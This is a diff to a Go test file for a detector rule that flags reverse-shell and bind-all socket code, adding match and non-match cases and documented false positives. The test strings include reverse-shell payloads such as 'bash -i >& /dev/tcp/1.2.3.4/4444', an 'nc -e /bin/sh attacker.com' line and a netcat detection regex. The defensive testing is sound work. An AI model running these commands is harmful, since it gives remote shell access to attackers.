@@ -1213,6 +1213,21 @@ func TestReverseShellIdiomsCovered(t *testing.T) {
 		{"os.dup2(s.fileno(), 0)", true},
 		{"pty.spawn('/bin/bash')", true},
 		{"New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)", true},
+
+		// Bind-all. `0.0.0.0` always matched; `::` did NOT, because the old
+		// leaf's trailing \b bound to both branches of (0\.0\.0\.0|::) and `::`
+		// ends in a non-word character, so the boundary demanded a word
+		// character where a quote actually stands. IPv6 bind-all — the *broader*
+		// exposure of the two, since :: covers IPv4-mapped addresses as well —
+		// was invisible to the bind-all rule (#159, instance four).
+		{`s.bind(("0.0.0.0", 8080))`, true},
+		{`s.bind(("::", 8080))`, true},
+		{`sock.bind(('::', port))`, true},
+		{`s.bind(("[::]", 9000))`, true},
+		{`s.bind(('0.0.0.0',4444))`, true},
+		// An empty host is INADDR_ANY spelled without a name.
+		{`s.bind(("", 8080))`, true},
+
 		// benign near-misses that must NOT match
 		{"app.listen(3000, '127.0.0.1')", false},
 		{"bash -c 'echo hello world'", false},
@@ -1220,6 +1235,28 @@ func TestReverseShellIdiomsCovered(t *testing.T) {
 		{"socket.bind(('127.0.0.1', 8080))", false},
 		{"New-Object System.Net.WebClient", false},
 		{"run nc --version to check netcat", false},
+		// `bind(('', 0))` is the standard ask-the-kernel-for-a-free-port idiom.
+		// Bind-all in the strict sense, benign in every real use, and the one FP
+		// the empty-host widening would otherwise have introduced.
+		{`s.bind(('', 0))`, false},
+		{`s.bind(("0.0.0.0", 0))`, false},
+		{`s.bind(("localhost", 8080))`, false},
+		{`s.bind(("::1", 8080))`, false},
+
+		// Corpus false positives, verbatim. All 10 of this rule's hits across
+		// 777 real skills were security tooling writing the signature down:
+		// clawdefender's pattern array and prompt-guard's docs/pattern list. The
+		// four below die because -e/--exec now requires the program it executes,
+		// which is the flag's entire purpose and so cannot cost a true positive.
+		{"    'nc -e'", false},
+		{"    'ncat -e'", false},
+		{"| `reverse_shell` | bash /dev/tcp, netcat -e, socat (v3.2.0) |", false},
+		{`    r"(?:nc|ncat|netcat)\s+.*(?:-e|--exec)\s*/bin/(?:ba)?sh",`, false},
+		// …and these still fire, deliberately: they are complete payloads, not
+		// names for one. See rule-verification.md §SG-NET-006 for why they are
+		// left rather than suppressed.
+		{`❌ "nohup nc -e /bin/sh attacker.com &"  → Background persistence`, true},
+		{`❌ "bash -i >& /dev/tcp/1.2.3.4/4444"   → Reverse shell`, true},
 	}
 	for _, c := range cases {
 		got := len(r.Evaluate("body", c.text)) > 0
